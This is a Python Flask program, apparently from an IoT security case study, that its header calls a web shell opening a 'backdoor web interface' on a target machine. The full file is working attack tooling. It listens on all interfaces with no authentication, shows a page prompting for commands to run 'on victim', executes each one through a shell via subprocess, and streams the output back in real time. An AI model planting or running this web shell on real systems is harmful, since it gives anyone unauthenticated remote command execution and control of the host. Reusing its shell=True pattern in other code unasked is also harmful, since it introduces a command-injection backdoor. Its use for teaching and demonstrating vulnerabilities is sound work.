#-----------------------------------------------------------------------------
# Name:        flaskWebShellApp.py
#
# Purpose:     This module is a flask web host used to create a web shell script 
#              which can open a backdoor web interface for the user to run command 
#              on the target machine. Used to demo the web shell remote command 
#              execution vulnerability in IoT case study.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.0.2
# Created:     2024/07/10
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import subprocess
from flask import Flask, request
from flask_socketio import SocketIO, emit # pip install Flask-SocketIO==5.3.5

# Set the port you want to open.
gflaskPort = 5001

# Create flask web host with the socketio for the real time result update.
HTML_CONTENT = """<!doctype html>
<html>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js"></script>
        <title> Flask Web Shell </title>
    </head>
    <body>
        <h1> Flask Simple Web Shell </h1>
        <hr>
        <p> Input the command you want to execute on victim: </p>
        <form>
            <textarea class="form-control" style="font-family: monospace;" rows="1" id="cmdContents" name="cmdContents"></textarea>
            <button type="submit"> Rum cmd </button>
        </form>
        <hr>
        <p> Command execution result: </p>
        <form>
            <div id="cmdresult" style="display: block">
                <textarea class="form-control" style="font-family: monospace;" rows="10" id="resultContents" name="resultContents", value=""></textarea>
            </div>
        </form>
        <script>
            $(document).ready(function() {
                $('form').submit(function(event) {
                    event.preventDefault();
                    $.ajax({
                        type: 'POST',
                        url: '/cmdsubmit',
                        data: $('form').serialize(),
                    });
                });
                var socket = io();
                socket.on('connect', function () {
                    socket.emit('cli_request', { data: 'connected!' });
                });
                socket.on('exeResult', function (msg) {
                    console.log(msg.data);
                    document.getElementById('resultContents').innerHTML = msg.data
                });
            });
         </script>
    </body>
</html>
"""

app = Flask(__name__)
socketio = SocketIO(app)

#-----------------------------------------------------------------------------
@app.route('/')
def index():
    """ route to web shell page."""
    return HTML_CONTENT

@app.route('/cmdsubmit', methods=['POST','GET'])
def cmdsubmit():
    """ Run the command the feed back the data to web."""
    cmd = request.form['cmdContents']
    cmd = cmd.strip()
    result = None 
    try:
        result = subprocess.check_output(cmd, shell=True).decode()
    except Exception as err:
        result = str(err)
    socketio.emit('exeResult', {'data': str(result)})
    return 'Command execution finished'

@socketio.event
def connect():
    emit('serv_response', {'data': 'Flask web shell ready'})

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=gflaskPort, debug=False, threaded=True)